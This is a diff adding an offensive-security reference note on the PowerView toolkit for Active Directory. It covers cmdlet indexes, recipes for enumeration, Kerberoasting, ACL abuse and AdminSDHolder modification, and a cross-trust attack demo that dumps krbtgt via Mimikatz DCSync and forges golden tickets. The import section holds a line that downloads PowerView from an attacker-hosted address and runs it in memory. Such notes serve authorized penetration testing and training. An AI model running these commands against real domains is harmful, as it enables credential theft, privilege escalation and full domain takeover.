@@ -1,0 +1,351 @@
+PowerView
+
+
+# Overview
+
+PowerView function reference and HarmJ0y recipes for Active Directory enumeration and abuse. Module path: /opt/PowerSploit/Recon/PowerView.ps1. Sections below label PowerView 2.x (Get-Net*) vs 3.x (Get-Domain*) cmdlets.
+
+
+# Related Notes
+
+powershell.txt           iwr/iex import and execution policy
+active-directory.txt     dsquery and on-domain enumeration
+ad-attacks.txt           Kerberoasting, DCSync, and ACL abuse
+windows-lateral.txt      Movement after creds and share access
+windows-credentials.txt  Mimikatz and hash handling
+Cobalt-Strike.txt        Beacon powerpick PowerView equivalents
+
+
+# Contents
+
+Import, PowerView 2.x Function Index, PowerView 3.x Naming, PowerView 3.x Recipes,
+Trust Attack Demo, Further Reading
+
+
+# Import
+
+## Overview
+
+Load from disk or in memory after hosting on the attack machine.
+
+## Commands
+
+    Import-Module .\PowerView.ps1
+
+    # in memory
+    iex (iwr -UseBasicParsing http://<attacker IP>/PowerView.ps1)
+
+## Validation / False Positives
+
+Get-Net* vs Get-Domain* indicates 2.x vs 3.x build; mixed tutorials cause command-not-found errors.
+Import-Module fails if execution policy blocks scripts; use Set-ExecutionPolicy Bypass -Scope Process first.
+
+
+# PowerView 2.x Function Index
+
+## Overview
+
+Legacy cmdlet names (pre-3.0). Prefer 3.x recipes below when the module supports them.
+
+## Commands
+
+Misc:
+Export-PowerViewCSV              Thread-safe CSV append
+Set-MacAttribute                 Sets MAC attributes for a file based on another file or input
+Copy-ClonedFile                  Copies a local file to a remote location, matching MAC properties
+Get-IPAddress                    Resolves a hostname to an IP
+Test-Server                      Tests connectivity to a specified server
+Convert-NameToSid                Converts a user/group name to a SID
+Convert-SidToName                Converts a SID to a group/user name
+Convert-NT4toCanonical           Converts NT4 name (dev/john) to canonical format
+Get-Proxy                        Enumerates local proxy settings
+Get-PathAcl                      Get ACLs for a local/remote file path with optional group recursion
+Get-UserProperty                 Returns properties specified for users
+Get-ComputerProperty             Returns properties specified for computers
+Find-InterestingFile             Search a path for files with specific terms in the name
+Invoke-CheckLocalAdminAccess     Check if current user has local admin on a host
+Get-DomainSearcher               Builds an ADSI searcher for a domain
+Get-ObjectAcl                    Returns ACLs for an AD object
+Add-ObjectAcl                    Adds an ACL to an AD object
+Get-LastLoggedOn                 Return last logged on user for a target host
+Get-CachedRDPConnection          Queries saved RDP connection entries on a target host
+Invoke-ACLScanner                Enumerate modifiable ACLs on a domain
+Get-GUIDMap                      Hash table of GUIDs to display names
+Get-DomainSID                    Return SID for the specified domain
+Invoke-ThreadedFunction          Helper for threaded invocation
+
+net *:
+Get-NetDomain                    Gets the current user's domain name
+Get-NetForest                    Gets the forest for the current domain
+Get-NetForestDomain              Gets all domains in the current forest
+Get-NetDomainController          Gets domain controllers for the current domain
+Get-NetUser                      Returns user objects (wildcard supported)
+Add-NetUser                      Adds a local or domain user
+Get-NetComputer                  Gets servers in the domain
+Get-NetPrinter                   Gets printer objects in a domain
+Get-NetOU                        Gets domain organizational units
+Get-NetSite                      Gets sites in a domain
+Get-NetSubnet                    Gets registered subnets
+Get-NetGroup                     Gets groups in a domain
+Get-NetGroupMember               Gets members of a domain group
+Get-NetLocalGroup                Gets members of a local group on remote host(s)
+Add-NetGroupUser                 Adds a user to a local or domain group
+Get-NetFileServer                Gets file servers used by domain users
+Get-DFSshare                     Gets DFS shares on a domain
+Get-NetShare                     Gets share info for a server
+Get-NetLoggedon                  Gets users logged onto a server
+Get-NetSession                   Gets active sessions on a server
+Get-NetRDPSession                Gets active RDP sessions (like qwinsta)
+Get-NetProcess                   Gets remote processes and owners
+Get-UserEvent                    Returns logon or TGT events from the event log
+Get-ADObject                     Maps a domain SID to user, group, or computer
+Set-ADObject                     Sets a property on a domain object
+
+GPO:
+Get-GptTmpl                      Parses GptTmpl.inf to a custom object
+Get-NetGPO                       Gets GPOs for a domain
+Get-NetGPOGroup                  Gets GPOs that set Restricted Groups
+Find-GPOLocation                 Machines a user/group has rights to via GPO
+Find-GPOComputerAdmin            Who has admin rights on a computer via GPO
+Get-DomainPolicy                 Returns default domain or DC policy
+
+User hunting:
+Invoke-UserHunter                Find machines where users are logged in; optional admin check
+Invoke-StealthUserHunter         Hunt via HomeDirectory file servers and sessions
+Invoke-ProcessHunter             Hunt processes by name or owner on domain machines
+Invoke-UserEventHunter           Hunt user logon events on DC event logs
+
+Domain trust:
+Get-NetDomainTrust               Gets trusts for the current domain
+Get-NetForestTrust               Gets trusts for the current forest
+Find-ForeignUser                 Users in groups outside their principal domain
+Find-ForeignGroup                Group members outside the queried domain
+Invoke-MapDomainTrust            Build a relational map of domain trusts
+
+Meta:
+Invoke-ShareFinder               Find non-standard shares on domain hosts
+Invoke-FileFinder                Find sensitive files on domain hosts
+Find-LocalAdminAccess            Find machines where current user has local admin
+Find-ManagedSecurityGroups       Managed security groups with writable membership
+Find-UserField                   Search a user field for a term
+Find-ComputerField               Search a computer field for a term
+Get-ExploitableSystem            Systems likely vulnerable to common exploits
+Invoke-EnumerateLocalAdmin       Local Administrators group members across machines
+
+
+# PowerView 3.x Naming
+
+## Overview
+
+HarmJ0y 3.0 naming schema. LDAP/.NET, WMI, and Win32 API backends are indicated by noun prefix.
+
+## Commands
+
+Verbs:
+    Get     Retrieve full raw data sets
+    Find    Find specific entries in a data set
+    Add     Add a new object
+    Set     Modify an object
+    Invoke  Catch-all for complex actions
+
+Nouns:
+    Verb-Domain*     LDAP/.NET queries
+    Verb-WMI*        WMI under the hood
+    Verb-Net*        Win32 API under the hood
+
+Legacy mapping:
+    Find-DomainUserLocation      replaces Invoke-UserHunter
+    Find-InterestingDomainShareFile   replaces Invoke-FileFinder
+    Get-DomainGPOUserLocalGroupMapping   replaces Find-GPOLocation
+
+
+# PowerView 3.x Recipes
+
+## Overview
+
+Operational LDAP filters, credential use, Kerberoast, GPO mapping, and ACL abuse. Authorized assessments only.
+
+## Commands
+
+Group membership (recurse up/down):
+    Get-DomainGroup -MemberIdentity <user/group>
+    Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+Alternate credentials:
+    $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
+    Get-DomainUser -Credential $Cred
+
+GPP password hosts:
+    Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
+
+Stale passwords (>1 year):
+    $Date = (Get-Date).AddYears(-1).ToFileTime()
+    Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset
+
+Enabled / disabled users:
+    Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
+    Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
+    Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
+    Get-DomainUser -UACFilter ACCOUNTDISABLE
+
+Smart card required / not required:
+    Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
+    Get-DomainUser -UACFilter SMARTCARD_REQUIRED
+    Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
+    Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
+
+Multiple identity types:
+    '<SID>', 'CN=<user>,CN=Users,DC=<domain>,DC=<tld>','<GUID>','<samAccountName>' | Get-DomainUser -Properties samaccountname,lastlogoff
+
+Service accounts and Kerberos:
+    Get-DomainUser -SPN
+    Get-DomainUser -PreauthNotRequired
+    Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+    Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
+    Get-DomainUser -LDAPFilter '(sidHistory=*)'
+    Get-DomainUser -TrustedToAuth
+    Get-DomainComputer -TrustedToAuth
+
+Unconstrained delegation:
+    $Computers = Get-DomainComputer -Unconstrained
+    $Users = Get-DomainUser -AllowDelegation -AdminCount
+
+Local groups on a remote server:
+    Get-NetLocalGroup <server>.<domain>
+    Get-NetLocalGroupMember -Method API -ComputerName <server>.<domain>
+
+Kerberoast an OU:
+    Invoke-Kerberoast -SearchBase "LDAP://OU=<ou>,DC=<domain>,DC=<tld>"
+
+User hunting (3.x):
+    Find-DomainUserLocation -ComputerUnconstrained -ShowAll
+    Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
+
+Computers in an OU:
+    Get-DomainComputer -SearchBase "ldap://OU=<ou>,DC=<domain>,DC=<tld>"
+
+Logged-on users in server OUs:
+    Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedon -ComputerName $_}}
+
+Global catalog:
+    Get-ForestGlobalCatalog
+    gc computers.txt | % {Get-DomainComputer -SearchBase "GC://<forest>" -LDAP "(name=$_)" -Properties dnshostname}
+
+Domain and DC policy:
+    $DCPolicy = Get-DomainPolicy -Policy DC
+    $DCPolicy.PrivilegeRights
+    $DomainPolicy = Get-DomainPolicy -Policy Domain
+    $DomainPolicy.KerberosPolicy
+    $DomainPolicy.SystemAccess
+
+GPO local group mapping:
+    Get-DomainGPOUserLocalGroupMapping -Identity <user/group>
+    Get-DomainGPOUserLocalGroupMapping -Identity <user> -Domain <domain> -LocalGroup RDP
+    Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
+
+Find sensitive files with creds:
+    $Password = "<password>" | ConvertTo-SecureString -AsPlainText -Force
+    $Credential = New-Object System.Management.Automation.PSCredential("<domain>\<user>",$Password)
+    Find-InterestingDomainShareFile -Domain <domain> -Credential $Credential
+
+ACL enumeration and abuse:
+    Get-DomainObjectAcl -Identity <user> -ResolveGUIDs -Domain <domain>
+    Add-DomainObjectAcl -TargetIdentity <user> -PrincipalIdentity <user> -Rights ResetPassword -Verbose
+    Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>' -ResolveGUIDs
+    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>' -PrincipalIdentity <user> -Rights All
+
+DCSync rights (replication ACLs):
+    Get-DomainObjectAcl "dc=<domain>,dc=<tld>" -ResolveGUIDs | ? {
+        ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
+    }
+
+Linked domain admin correlation:
+    Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}
+
+Save and reload objects:
+    Get-DomainUser | Export-Clixml user.xml
+    $Users = Import-Clixml user.xml
+
+Machine accounts in privileged groups:
+    Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
+
+GPO modification rights:
+    Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
+
+GPOs applied to a machine:
+    Get-DomainGPO -ComputerIdentity <host>.<domain>
+
+Non-global groups:
+    Get-DomainGroup -GroupScope NotGlobal -Properties name
+
+Foreign principals in global catalog:
+    $ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://<domain>" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
+
+Impersonation (-sta mode):
+    $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
+    Invoke-UserImpersonation -Credential $Cred
+    Invoke-RevertToSelf
+
+Outlier computer properties:
+    Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
+
+Set object properties and owner:
+    Set-DomainObject <user> -Set @{'mstsinitialprogram'='\\<host>\program.exe'} -Verbose
+    Set-DomainObjectOwner -Identity <user> -OwnerIdentity <owner>
+
+## Validation / False Positives
+
+Kerberoast output requires accounts with SPNs and a crackable encryption type; no output may mean none set or AES-only service accounts.
+DCSync ACL queries return candidates, not proof of replicable creds; confirm with actual dcsync in a controlled lab.
+AdminSDHolder and ResetPassword examples modify AD; use only with explicit authorization.
+
+
+# Trust Attack Demo
+
+## Overview
+
+HarmJ0y 44con_demo.ps1 narrative: map trusts, foreign groups, child-domain krbtgt, golden ticket across trust. Lab script reference only.
+
+## Commands
+
+    Import-Module .\powerview.ps1
+    Import-Module .\mimikatz.ps1
+
+    Invoke-MapDomainTrust
+
+    Find-ForeignGroup -Domain <external.domain>
+    Find-ForeignGroup -Domain <external.domain> | Select-Object -ExpandProperty UserName | Convert-SidToName
+
+    Get-NetUser <user> -Domain <domain>
+    Get-NetGroup -UserName <user> -Domain <domain> | Convert-NameToSid | fl
+
+    Invoke-Mimikatz -Command '"lsadump::dcsync /user:<child>\krbtgt"'
+
+    "<child>\krbtgt" | Convert-NameToSid | fl
+    "<parent>\krbtgt" | Convert-NameToSid | fl
+
+    Invoke-Mimikatz -Command '"kerberos::golden /user:<user> /domain:<child.domain> /sid:<child-domain-sid> /krbtgt:<krbtgt-hash> /sids:<enterprise-admins-sid> /ptt"'
+
+    Get-NetDomainController -Domain <parent.domain>
+    dir \\<DC>.<parent.domain>\C$
+
+    Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<parent.domain> /user:<parent>\krbtgt"'
+    Invoke-Mimikatz -Command '"kerberos::purge"'
+
+    Invoke-Mimikatz -Command '"kerberos::golden /user:<user> /domain:<parent.domain> /id:<rid> /groups:<group-rids> /sid:<domain-sid> /krbtgt:<krbtgt-hash> /ptt"'
+
+    Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<external.domain> /user:<external>\krbtgt"'
+
+
+# Further Reading
+
+BSides LV 2015             Building an Empire with PowerShell
+BSides DC 2015             Bridging the Gap: Lessons in Adversarial Tradecraft
+BSides DC 2015             It, Do it Live (PowerShell Digital Forensics)
+PowerShell Summit 2016     Digital Forensics with PowerShell
+BSides LV 2016             Building an EmPyre with Python
+DerbyCon 2016              A Year in the Empire
+DerbyCon 2016              Living Off the Land 2: A Minimalists Guide to Windows Defense
+DerbyCon 2016              Attacking EvilCorp: Anatomy of a Corporate Hack
